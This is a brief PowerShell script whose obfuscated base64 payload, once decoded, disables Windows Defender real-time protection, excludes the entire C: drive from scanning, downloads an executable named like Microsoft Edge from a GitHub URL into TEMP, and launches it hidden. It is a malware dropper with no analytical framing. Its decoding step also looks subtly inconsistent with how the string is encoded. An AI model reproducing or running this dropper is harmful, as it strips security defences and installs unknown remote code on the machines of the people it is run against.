$encodedCommand = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICdDOlwnCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OeHRjY2lvby9vb293L3JlZnMvaGVhZHMvbWFpbi9tc2VkZ2UuZXhlJyAtT3V0RmlsZSAnJGVudjpURU1QXG1zZWRnZS5leGUnClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICckZW52OlRFTVBcbXNlZGdlLmV4ZScgLVdpbmRvd1N0eWxlIEhpZGRlbiAtV2FpdA=="
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
